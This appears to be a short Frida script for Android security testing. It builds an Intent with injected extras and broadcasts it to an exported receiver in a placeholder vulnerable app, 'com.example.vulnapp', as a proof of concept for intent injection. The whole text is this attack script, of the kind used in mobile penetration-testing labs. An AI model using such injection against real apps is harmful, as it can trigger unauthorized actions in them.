Java.perform(function () {
    var Intent = Java.use("android.content.Intent");
    var ComponentName = Java.use("android.content.ComponentName");
    var currentApplication = Java.use("android.app.ActivityThread").currentApplication();
    var context = currentApplication.getApplicationContext();

    var injectedIntent = Intent.$new("android.intent.action.SEND");
    var componentName = ComponentName.$new("com.example.vulnapp", "com.example.vulnapp.receiver.MyReceiver");
    injectedIntent.setComponent(componentName);
    injectedIntent.putExtra("injected_key", "InjectedValue");
    injectedIntent.putExtra("injected_flag", true);

    context.sendBroadcast(injectedIntent);
    console.log("[+] Intent injection sent.");
});
